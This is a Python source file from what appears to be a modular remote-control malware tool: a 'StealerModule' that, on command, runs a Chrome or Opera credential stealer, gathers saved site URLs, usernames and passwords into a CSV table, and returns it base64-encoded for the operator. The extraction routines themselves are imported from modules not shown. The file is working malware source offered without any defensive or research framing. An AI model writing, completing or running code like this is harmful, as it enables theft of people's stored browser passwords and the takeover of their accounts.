import base64
import csv
from io import StringIO
from modules.basemodule import BaseModule

from modules.stealer.stealers.chrome import ChromeStealer
from modules.stealer.stealers.opera import OperaStealer

class StealerModule(BaseModule):

    @staticmethod
    def get_module_id() -> str:
        return "stealer"

    @staticmethod
    def get_topic() -> str:
        return "stealer"

    def do(self, topic, payload):
        if (len(topic) == 0):
            return "Browser not specified"

        stealer = None
        if (topic[0].lower() == "chrome"):
            stealer = ChromeStealer()
        elif (topic[0].lower() == "opera"):
            stealer = OperaStealer()

        if stealer == None:
            return "Browser not specified"

        f = StringIO()
        writer = csv.writer(f, delimiter=";")
        writer.writerow(["Index", "URL", "Username", "Password"])
        state = stealer.steal(writer)
        return base64.b64encode(f.getvalue().encode()).decode() if state == True else state


